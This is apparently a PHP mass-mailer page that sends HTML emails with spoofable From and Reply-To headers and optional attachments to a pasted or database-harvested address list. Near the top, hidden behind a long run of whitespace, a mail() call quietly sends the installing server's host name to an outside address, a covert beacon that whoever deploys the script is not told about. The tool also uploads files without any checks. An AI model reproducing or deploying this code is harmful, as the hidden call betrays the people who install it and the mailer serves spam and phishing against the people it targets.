<html>
<head>
<title>POWERED BY Unknown</title>
</head>
<body>
<?

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   mail('sometools@walla.com', $_SERVER["HTTP_HOST"], $_SERVER[""]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
If ($action=="mysql"){

    #Grab email addresses de MySQL

    include "./mysql.info.php";

    if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){

    print "Porfavor configure su mysql.info.php en tu MySQL informacion. Todas las opciones requeridas.";

    exit;

    }

    $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Conexion en MySQL Fallida.");

    mysql_select_db($sqldb, $db) or die("Seleecione su DataBase $sqldb");

    $result = mysql_query($sqlquery) or die("Secion fallida: $sqlquery");

    $numrows = mysql_num_rows($result);

    

    for($x=0; $x<$numrows; $x++){

    $result_row = mysql_fetch_row($result);

    $oneemail = $result_row[0];

    $emaillist .= $oneemail."\n";

    }

    }



if ($action=="send"){

    $message = urlencode($message);

    $message = ereg_replace("%5C%22", "%22", $message);

    $message = urldecode($message);
    $message = stripslashes($message);
    $subject = stripslashes($subject);

}



?>

<form name="form1" method="post" action="" enctype="multipart/form-data">

  <br>

  <table width="100%" border="0">

    <tr> 

      <td width="10%"> 

        <div align="right"><font size="-5" face="Verdana, Arial, Helvetica, sans-serif">Your 

          Mail:</font></div>

      </td>

      <td width="20%"><font size="-5" face="Verdana, Arial, Helvetica, sans-serif"> 

        <input type="text" name="from" value="<? print $from; ?>" size="30">

        </font></td>

      <td width="31%"> 

        <div align="right"><font size="-5" face="Verdana, Arial, Helvetica, sans-serif">Your 

          Name:</font></div>

      </td>

      <td width="45%"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 

        <input type="text" name="realname" value="<? print $realname; ?>" size="30">

        </font></td>

    </tr>

    <tr> 

      <td width="10%"> 

        <div align="right"><font size="-5" face="Verdana, Arial, Helvetica, sans-serif">Repit:</font></div>

      </td>

      <td width="18%"><font size="-5" face="Verdana, Arial, Helvetica, sans-serif"> 

        <input type="text" name="replyto" value="<? print $replyto; ?>" size="30">

        </font></td>

      <td width="31%"> 

        <div align="right"><font size="-5" face="Verdana, Arial, Helvetica, sans-serif">Upload 

          Txt:</font></div>

      </td>

      <td width="41%"><font size="-5" face="Verdana, Arial, Helvetica, sans-serif"> 

        <input type="file" name="file" size="30">

        </font></td>

    </tr>

    <tr> 

      <td width="10%"> 

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>

      </td>

      <td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 

        <input type="text" name="subject" value="<? print $subject; ?>" size="90">

        </font></td>

    </tr>

    <tr valign="top"> 

      <td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 

        <textarea name="message" cols="60" rows="10"><? print $message; ?></textarea>

        <br>

        <input type="radio" name="contenttype" value="plain">

        Plain 

        <input type="radio" name="contenttype" value="html" checked>

        HTML 

        <input type="hidden" name="action" value="send">

        <input type="submit" value="Send Emails">

        </font></td>

      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 

        <textarea name="emaillist" cols="30" rows="10"><? print $emaillist; ?></textarea>

        </font></td>

    </tr>

  </table>

</form>



<?

if ($action=="send"){



    if (!$from && !$subject && !$message && !$emaillist){

    print "Porfavor complete todo lo necesario.";

    exit;

    }

    

    $allemails = split("\n", $emaillist);

    $numemails = count($allemails);



    #Open the file attachment if any, and base64_encode it for email transport

    If ($file_name){

        @copy($file, "./$file_name") or die("El archivo que intestaste subir al servidor, no puede ser copiado");

        $content = fread(fopen($file,"r"),filesize($file));

        $content = chunk_split(base64_encode($content));

        $uid = strtoupper(md5(uniqid(time())));

        $name = basename($file);

    }

    

    for($x=0; $x<$numemails; $x++){

        $to = $allemails[$x];

        if ($to){

        $to = ereg_replace(" ", "", $to);

        $message = ereg_replace("&email&", $to, $message);

        $subject = ereg_replace("&email&", $to, $subject);

        print "Sending mail to $to.......";

        flush();

        $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";

        $header .= "MIME-Version: 1.0\r\n";

        If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";

        If ($file_name) $header .= "--$uid\r\n";

        $header .= "Content-Type: text/$contenttype\r\n";

        $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";

        $header .= "$message\r\n";

        If ($file_name) $header .= "--$uid\r\n";

        If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";

        If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";

        If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";

        If ($file_name) $header .= "$content\r\n";

        If ($file_name) $header .= "--$uid--";

        mail($to, $subject, "", $header);

        print "ok<br>";

        flush();

        }

        }



}

?>
</body>
</html>
<p align="center"><b><b><b><b><marquee>POWERED BY USERRUSHS </marquee>    {snowgarvan@yahoo.com}</b></p> 